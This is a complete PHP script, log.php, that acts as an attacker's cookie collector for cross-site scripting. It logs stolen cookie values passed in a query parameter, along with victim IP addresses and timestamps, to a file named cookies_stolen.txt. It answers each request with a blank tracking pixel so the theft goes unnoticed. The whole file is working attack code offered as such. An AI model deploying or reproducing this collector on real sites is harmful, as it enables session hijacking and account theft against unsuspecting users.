<?php
// This script captures the cookie data sent via the Image tag
// File name: log.php

$file = 'cookies_stolen.txt';

// Get the 'c' parameter (cookie data)
$cookieData = $_GET['c'] ?? '';

if ($cookieData) {
    // Append the data to a file
    $entry = date('Y-m-d H:i:s') . " | IP: " . $_SERVER['REMOTE_ADDR'] . " | DATA: " . $cookieData . "\n";
    file_put_contents($file, $entry, FILE_APPEND);
    
    // Return a 1x1 pixel transparent image to avoid breaking the page visually
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
} else {
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
}
?>
